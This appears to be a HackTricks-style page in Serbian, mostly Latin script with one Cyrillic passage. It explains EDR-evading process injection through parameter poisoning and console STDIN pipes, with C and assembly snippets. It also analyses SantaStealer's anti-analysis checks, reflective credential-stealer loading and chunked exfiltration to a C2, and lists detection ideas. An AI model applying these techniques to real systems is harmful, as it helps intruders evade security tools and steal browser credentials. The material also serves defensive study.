Process Parameter Poisoning (P3) je tehnika **ubacivanja u proces / izbegavanja EDR-a** koja izbegava klasični put udaljenog upisa (`VirtualAllocEx` + `WriteProcessMemory`). Umesto kopiranja bajtova u već pokrenut ciljni proces, ona iskorišćava činjenicu da Windows **kopira odabrane početne parametre `CreateProcessW` u podređeni proces** i čuva ih unutar `PEB->ProcessParameters` (`RTL_USER_PROCESS_PARAMETERS`).<sup>[[28]](#references)[[29]](#references)</sup>

### Nosači koje `CreateProcessW` može da otruje

Korisni nosači su:

- `lpCommandLine` → `RTL_USER_PROCESS_PARAMETERS.CommandLine`
- `lpEnvironment` (uz `CREATE_UNICODE_ENVIRONMENT`) → `RTL_USER_PROCESS_PARAMETERS.Environment`
- `STARTUPINFO.lpReserved` → `RTL_USER_PROCESS_PARAMETERS.ShellInfo`

Praktična ograničenja nosača:

- `lpCommandLine` mora da pokazuje na **upisivu memoriju** za `CreateProcessW`, a ograničen je na **32,767 Unicode znakova**, uključujući nulti terminator.
- `lpEnvironment` mora da bude Unicode blok okruženja koji sadrži uzastopne nizove `NAME=VALUE\0`, završene dodatnim `\0`.
- `lpReserved` je zvanično rezervisan, pa mapiranje na `ShellInfo` treba smatrati detaljem implementacije, a ne stabilnim dokumentovanim ugovorom.

Time se uobičajeno kreiranje procesa pretvara u **primitivu za prenos payload-a**. Operater kreira podređeni proces sa početnim podacima pod kontrolom napadača i prepušta Windows-u da izvrši kopiranje između procesa.

### Tok udaljenog pronalaženja bez API-ja za udaljeni upis

Po kreiranju podređenog procesa, kopirani bafer se pronalazi pomoću **primitiva samo za čitanje**:

1. `NtQueryInformationProcess(ProcessBasicInformation)` → dobavljanje `PROCESS_BASIC_INFORMATION.PebBaseAddress`
2. Čitanje udaljenog `PEB`-a
3. Praćenje `PEB.ProcessParameters`
4. Čitanje `RTL_USER_PROCESS_PARAMETERS`
5. Korišćenje izabranog pokazivača:
   - `parameters.CommandLine.Buffer`
   - `parameters.Environment`
   - `parameters.ShellInfo.Buffer`

Minimalni tok:

```c
NtQueryInformationProcess(hProcess, ProcessBasicInformation, &pbi, sizeof(pbi), &retLen);
NtReadVirtualMemoryEx(hProcess, pbi.PebBaseAddress, &peb, sizeof(peb), &bytesRead, 0);
NtReadVirtualMemoryEx(hProcess, peb.ProcessParameters, &params, sizeof(params), &bytesRead, 0);
// params.CommandLine.Buffer / params.Environment / params.ShellInfo.Buffer
```

### Izvršavanje kopiranog bafera parametara

Kopirani region parametara je obično `RW`, a ne izvršiv. Uobičajeni P3 lanac je:

1. Kreirajte proces na uobičajen način (ne suspendovan)
2. Učinite izabranu stranicu parametara izvršivom pomoću `NtProtectVirtualMemory` / `VirtualProtectEx`
3. Ponovo upotrebite handle glavne niti koji je već vraćen u `PROCESS_INFORMATION`
4. Preusmerite izvršavanje pomoću `NtSetContextThread` (`CONTEXT_CONTROL`, prepišite `RIP`)

Za razliku od klasičnih postupaka preuzimanja kontrole nad niti, ovo **ne zahteva** `SuspendThread` / `ResumeThread`; kontekst se može promeniti direktno preko vraćenog handle-a glavne niti.

Time se izbegava nekoliko API-ja koji se često nadgledaju zbog injektovanja:

- `VirtualAllocEx` / `NtAllocateVirtualMemory(Ex)`
- `WriteProcessMemory` / `NtWriteVirtualMemory`
- `CreateRemoteThread` / `NtCreateThreadEx`
- često i `SuspendThread` / `ResumeThread`

### Ograničenje nul-bajta i etapni shellcode

Sva tri nosača su **stringovi ili stringovima slični podaci**, pa se sirovi payload koji sadrži `0x00` skraćuje tokom prenosa. Praktično rešenje je **prva faza bez nul-bajtova** koja ponovo sastavlja konstante tokom izvršavanja, a zatim učitava proizvoljnu drugu fazu.

Jednostavan obrazac je sinteza konstanti zasnovana na XOR-u:

```asm
mov rax, XOR_A
mov r15, XOR_B
xor rax, r15 ; result = desired value, without embedding 0x00 bytes
```

Ovo omogućava prvom stadijumu da napravi stringove na steku, argumente API-ja, putanje do DLL-ova ili loader shellcode-a drugog stadijuma, a da u prenetom parametru ne ugrađuje null bajtove.

### Pozivi API-ja zasnovani na steku iz prvog stadijuma

Kada prvi stadijum mora da pozove API-je kao što je `LoadLibraryA`, može da:

- smesti string/bufer na stek ciljnog procesa
- rezerviše **32-bajtni x64 shadow space**
- postavi `RCX`, `RDX`, `R8`, `R9` na konstante ili pokazivače relativne u odnosu na `RSP`
- održi poravnanje `RSP` na **16 bajtova** pre poziva

Drugi stadijum zatim može da se kopira sa steka u alokaciju `PAGE_READWRITE`, promeni joj se zaštita u `PAGE_EXECUTE_READ` pomoću `VirtualProtect`, a potom se izvršavanje može preusmeriti na nju, čime se izbegava direktna RWX alokacija.

### Ideje za detekciju

Autori navode sledeće mogućnosti za lov na pretnje:

- `VirtualProtectEx` / `NtProtectVirtualMemory` koji menjaju **stranice parametara procesa u izvršne**
- promena zaštite praćena pozivom `SetThreadContext` / `NtSetContextThread`
- udaljeno čitanje `PEB`-a, a zatim `RTL_USER_PROCESS_PARAMETERS`
- neuobičajeno dugačke vrednosti ili vrednosti visoke entropije za `lpCommandLine`, `lpEnvironment` ili `STARTUPINFO.lpReserved` pri kreiranju procesa

### Napomene

- P3 je **trik za prenos između procesa**, a ne samostalni mehanizam za izvršavanje: kopiranom parametru i dalje su potrebni promena dozvole na izvršavanje i metod za preusmeravanje izvršavanja.
- Autori su razmatrali `RtlCreateProcessReflection` / Dirty Vanity, ali su odustali jer interno dolazi do sumnjivih primitiva kao što su `NtWriteVirtualMemory` i `NtCreateThreadEx`.

## Ubrizgavanje kroz STDIN pipe konzole

Interaktivni podproces konzole može posлужити и као **примитива за пренос payload-а**. Инјектор преусмерава стандардни улаз подређеног процеса на pipe и шаље маркер праћен shellcode-ом. Када програм конзоле прочита податке у сопствену приватну меморију, инјектор проналази тај бафер, поставља га као извршив и преусмерава нит подређеног процеса на њега. Тиме се избегавају `VirtualAllocEx` и `WriteProcessMemory`, али је ово и даље убризгавање у процес, а не општи EDR bypass.<sup>[[41]](#references)</sup>

Упркос опису „named-pipe“, референтна имплементација позива `CreatePipe`, који креира **анонимни pipe**. Windows интерно имплементира анонимне pipe-ове помоћу јединствено именованих pipe објеката, али PoC не бира путању `\\.\pipe\<name>` нити позива `CreateNamedPipe`. Креира ручке које се могу наследити, са подразумеваним безбедносним дескриптором, смешта ручку за читање у `STARTUPINFO.hStdInput`, поставља `STARTF_USESTDHANDLES` и покреће нови подређени процес уз омогућено наслеђивање ручки. Зато овај PoC покреће достављени извршни фајл конзоле; не повезује свој pipe са постојећим процесом.<sup>[[41]](#references)[[42]](#references)[[43]](#references)</sup>

### Референтни ток рада

Имплементација користи следећи ланац:<sup>[[41]](#references)</sup>

1. Креира парове анонимних pipe-ова за `STDIN` и `STDOUT` подређеног процеса. Онемогућава наслеђивање на две ручке на страни родитељског процеса и затвара дупликате ручки на страни подређеног процеса у родитељу након креирања процеса.
2. Покреће интерактивни извршни фајл као што је `netsh.exe` или `nslookup.exe` помоћу `CREATE_NEW_CONSOLE`. Подређени процес наслеђује преусмерене стандардне ручке.
3. Шаље цео бинарни низ `rawData` помоћу `WriteFile` кроз ручку `STDIN` на страни родитељског процеса. Програм конзоле преузима бајтове и оставља копију у једном од својих приватних меморијских региона са потврђеним страницама.
4. Претражује адресни простор подређеног процеса помоћу `VirtualQueryEx`, чита потенцијалне регионе `MEM_PRIVATE` помоћу `ReadProcessMemory` и тражи маркер на почетку `rawData`.
5. Мења заштиту откривеног бафера у `PAGE_EXECUTE_READWRITE` помоћу `VirtualProtectEx`.
6. Идентификује главну нит, суспендује је, поставља `RIP` на `found_address + 0x19` помоћу `NtSetContextThread`, а затим је наставља.

```powershell
InjectSetConsole.exe C:\Windows\System32\netsh.exe
```

Dostavljena implementacija specifična je za x64: menja `CONTEXT.Rip`, a ugrađeni payload je x64 shellcode. `rawData` počinje markerom od 25 bajtova, pa izvršni bajtovi počinju na heksadecimalnom pomeraju `0x19`. Prilikom zamene payload-a, sačuvajte taj raspored ili zajedno ažurirajte marker, vektor pretrage, veličinu niza i pomeraj izvršavanja. Komentari u izvornom kodu navode i `0x0A`, `0x0D` i `0x1A` kao nedozvoljene znakove. Ovaj postupak ne menja token ni privilegije child procesa.<sup>[[41]](#references)</sup>

Za male native pomoćne programe i obrasce kompajliranja payload-a pogledajte [Windows C Payloads](windows-local-privilege-escalation/windows-c-payloads.md).

## SantaStealer taktike za fileless izbegavanje detekcije i krađu akreditiva

SantaStealer (poznat i kao BluelineStealer) pokazuje kako savremeni info-stealeri objedinjuju AV bypass, anti-analysis i pristup akreditivima u jednom postupku.<sup>[[24]](#references)</sup>

### Provera rasporeda tastature i odlaganje u sandbox-u

- Zastavica konfiguracije (`anti_cis`) nabraja instalirane rasporede tastature pomoću funkcije `GetKeyboardLayoutList`. Ako pronađe ćirilični raspored, uzorak pravi prazan marker `CIS` i prekida rad pre pokretanja kradljivaca, čime osigurava da se nikada ne aktivira na isključenim lokalitetima, a pritom ostavlja artefakt za lov na pretnje.

```c
HKL layouts[64];
int count = GetKeyboardLayoutList(64, layouts);
for (int i = 0; i < count; i++) {
    LANGID lang = PRIMARYLANGID(HIWORD((ULONG_PTR)layouts[i]));
    if (lang == LANG_RUSSIAN) {
        CreateFileA("CIS", GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, 0, NULL);
        ExitProcess(0);
    }
}
Sleep(exec_delay_seconds * 1000); // config-controlled delay to outlive sandboxes
```

### Slojevita logika `check_antivm`

- Varijanta A prolazi kroz listu procesa, hešira svaki naziv pomoću prilagođene rolling checksum funkcije i upoređuje rezultat sa ugrađenim listama blokiranja za debuggere/sandbox okruženja; ponavlja izračun checksum vrednosti nad nazivom računara i proverava radne direktorijume kao što je `C:\analysis`.
- Varijanta B proverava sistemska svojstva (minimalan broj procesa, nedavno vreme pokretanja), poziva `OpenServiceA("VBoxGuest")` da bi otkrila VirtualBox additions i vrši vremenske provere oko pauza kako bi uočila izvršavanje instrukciju po instrukciju. Svaki pogodak prekida izvršavanje pre pokretanja modula.

### Fileless pomoćni program + dvostruko ChaCha20 reflektivno učitavanje

- Primarna DLL/EXE datoteka sadrži Chromium pomoćni program za krađu kredencijala, koji se ili zapisuje na disk ili se ručno mapira u memoriju; u fileless režimu samostalno razrešava importe/relokacije, tako da se ne zapisuju nikakvi artefakti pomoćnog programa.
- Taj pomoćni program čuva DLL drugog stepena, dvostruko šifrovan pomoću ChaCha20 (dva ključa od 32 bajta + nonce vrednosti od 12 bajtova). Nakon oba prolaza, blob se učitava reflektivno (bez `LoadLibrary`) i pozivaju se export funkcije `ChromeElevator_Initialize/ProcessAllBrowsers/Cleanup`, izvedene iz [ChromElevator](https://github.com/xaitax/Chrome-App-Bound-Encryption-Decryption).<sup>[[25]](#references)</sup>
- Rutine ChromElevator koriste direktni syscall za reflektivno process hollowing ubrizgavanje u aktivan Chromium browser, nasleđuju AppBound Encryption ključeve i dešifruju lozinke/kolačiće/podatke o kreditnim karticama direktno iz SQLite baza podataka, uprkos ojačanoj zaštiti ABE.


### Modularno prikupljanje u memoriji i HTTP eksfiltracija u delovima

- `create_memory_based_log` prolazi kroz globalnu tabelu pokazivača na funkcije `memory_generators` i pokreće po jednu nit za svaki omogućen modul (Telegram, Discord, Steam, snimci ekrana, dokumenti, ekstenzije browsera itd.). Svaka nit upisuje rezultate u deljene baferе i prijavljuje broj fajlova nakon perioda čekanja od oko 45 sekundi.
- Po završetku, sve se pakuje pomoću statički linkovane biblioteke `miniz` kao `%TEMP%\\Log.zip`. Zatim `ThreadPayload1` čeka 15 sekundi i šalje arhivu u delovima od 10 MB putem HTTP POST zahteva na `http://<C2>:6767/upload`, lažno predstavljajući browser `multipart/form-data` granicu (`----WebKitFormBoundary***`). Svaki deo dodaje `User-Agent: upload`, `auth: <build_id>`, opciono `w: <campaign_tag>`, a poslednji deo dodaje `complete: true` kako bi C2 znao da je ponovno sastavljanje završeno.

## References

- [1] [Napredne tehnike izbegavanja detekcije: precizno prepisivanje modula](https://medium.com/@toneillcodes/advanced-evasion-tradecraft-precision-module-stomping-b51feb0978fe)
- [2] [toneillcodes/windows-process-injection](https://github.com/toneillcodes/windows-process-injection)
- [3] [Crystal Kit – blog](https://rastamouse.me/crystal-kit/)
- [4] [Crystal-Kit – GitHub](https://github.com/rasta-mouse/Crystal-Kit)
- [5] [Elastic – Stekovi poziva: nema više besplatnih prolaza za malware](https://www.elastic.co/security-labs/call-stacks-no-more-free-passes-for-malware)
- [6] [Crystal Palace – dokumentacija](https://tradecraftgarden.org/docs.html)
- [7] [simplehook – primer](https://tradecraftgarden.org/simplehook.html)
- [8] [stackcutting – primer](https://tradecraftgarden.org/stackcutting.html)
- [9] [Draugr – PIC za lažiranje steka poziva](https://github.com/NtDallas/Draugr)
- [10] [Unit42 – Novi lanac infekcije i obfuskacija zasnovana na ConfuserEx za DarkCloud Stealer](https://unit42.paloaltonetworks.com/new-darkcloud-stealer-infection-chain/)
- [11] [Synacktiv – Treba li verovati svom zero trust modelu? Zaobilaženje Zscaler provera bezbednosnog stanja](https://www.synacktiv.com/en/publications/should-you-trust-your-zero-trust-bypassing-zscaler-posture-checks.html)
- [12] [Check Point Research – Pre ToolShell-a: Istraživanje prethodnih ransomware operacija grupe Storm-2603](https://research.checkpoint.com/2025/before-toolshell-exploring-storm-2603s-previous-ransomware-operations/)
- [13] [Hexacorn – DLL ForwardSideLoading: zloupotreba prosleđenih export funkcija](https://www.hexacorn.com/blog/2025/08/19/dll-forwardsideloading/)
- [14] [Windows 11 inventar prosleđenih export funkcija (apis_fwd.txt)](https://hexacorn.com/d/apis_fwd.txt)
- [15] [Microsoft Learn – Redosled pretrage dinamički linkovanih biblioteka](https://learn.microsoft.com/en-us/windows/win32/dlls/dynamic-link-library-search-order)
- [16] [Microsoft Learn – Bezbednost procesa i prava pristupa](https://learn.microsoft.com/en-us/windows/win32/procthread/process-security-and-access-rights)
- [17] [Microsoft – EKU referenca (MS-PPSEC)](https://learn.microsoft.com/openspecs/windows_protocols/ms-ppsec/651a90f3-e1f5-4087-8503-40d804429a88)
- [18] [Sysinternals – Process Monitor](https://learn.microsoft.com/sysinternals/downloads/procmon)
- [19] [Pokretač CreateProcessAsPPL](https://github.com/2x7EQ13/CreateProcessAsPPL)
- [20] [Zero Salarium – Suprotstavljanje EDR-ovima uz zaštitu koju pruža Protected Process Light (PPL)](https://www.zerosalarium.com/2025/08/countering-edrs-with-backing-of-ppl-protection.html)
- [21] [Zero Salarium – Zaobilaženje zaštitne barijere Windows Defendera tehnikom preusmeravanja fascikli](https://www.zerosalarium.com/2025/09/Break-Protective-Shell-Windows-Defender-Folder-Redirect-Technique-Symlink.html)
- [22] [Microsoft – Referenca za komandu mklink](https://learn.microsoft.com/windows-server/administration/windows-commands/mklink)
- [23] [Check Point Research – Iza zavese Pure: od RAT-a do builder-a i programera](https://research.checkpoint.com/2025/under-the-pure-curtain-from-rat-to-builder-to-coder/)
- [24] [Rapid7 – SantaStealer stiže u grad: novi, ambiciozni infostealer](https://www.rapid7.com/blog/post/tr-santastealer-is-coming-to-town-a-new-ambitious-infostealer-advertised-on-underground-forums)
- [25] [ChromElevator – Dešifrovanje Chrome App-Bound Encryption](https://github.com/xaitax/Chrome-App-Bound-Encryption-Decryption)
- [26] [Check Point Research – GachiLoader: otkrivanje Node.js malware-a pomoću praćenja API-ja](https://research.checkpoint.com/2025/gachiloader-node-js-malware-with-api-tracing/)
- [27] [Uspavana lepotica: uspavljivanje Adaptix-a pomoću Crystal Palace-a](https://maorsabag.github.io/posts/adaptix-stealthpalace/sleeping-beauty/)
- [28] [SensePost – Trovanje parametara procesa](https://sensepost.com/blog/2026/process-parameter-poisoning/)
- [29] [Orange Cyberdefense – p3-loader](https://github.com/Orange-Cyberdefense/p3-loader)
- [30] [Uspavana lepotica II: CFG, CET i lažiranje steka](https://maorsabag.github.io/posts/adaptix-stealthpalace/sleeping-beauty-ii)
- [31] [Ekko obfuskacija tokom spavanja](https://github.com/Cracked5pider/Ekko)
- [32] [SysWhispers4 – GitHub](https://github.com/JoasASantos/SysWhispers4)
- [33] [blog.xpnsec.com – Sakrivanje Dotnet ETW-a](https://blog.xpnsec.com/hiding-your-dotnet-etw)
- [34] [repnz/etw-providers-docs](https://github.com/repnz/etw-providers-docs)
- [35] [trustedsec.com – Zloupotreba Chrome Remote Desktop-a u operacijama Red Team-a: praktični vodič](https://trustedsec.com/blog/abusing-chrome-remote-desktop-on-red-team-operations-a-practical-guide)
- [36] [Check Point Research – BTR Reforged: pretvaranje Defender-ovog drajvera za sanaciju u primitivu za operacije u kernelu](https://research.checkpoint.com/2026/btr-reforged-weaponizing-defenders-remediation-driver-as-a-kernel-operation-primitive/)
- [37] [Dump-GUY – BTR_CLI](https://github.com/Dump-GUY/BTR_CLI)
- [38] [Prateći kod za MDSec Function Peekaboo](https://github.com/mdsecactivebreach/functionpeekaboo)
- [39] [MDSec – Function Peekaboo: pravljenje funkcija koje same sebe maskiraju pomoću LLVM-a](https://mdsec.co.uk/2025/10/function-peekaboo-crafting-self-masking-functions-using-llvm/)
- [40] [Microsoft Learn – VirtualProtect](https://learn.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-virtualprotect)
- [41] [TwoSevenOneT – Izvorni kod za InjectSetConsole](https://github.com/TwoSevenOneT/InjectSetConsole)
- [42] [Microsoft Learn – Funkcija CreatePipe](https://learn.microsoft.com/en-us/windows/win32/api/namedpipeapi/nf-namedpipeapi-createpipe)
- [43] [Microsoft Learn – Kreiranje child procesa sa preusmerenim ulazom i izlazom](https://learn.microsoft.com/en-us/windows/win32/procthread/creating-a-child-process-with-redirected-input-and-output)
{{#include ../banners/hacktricks-training.md}}
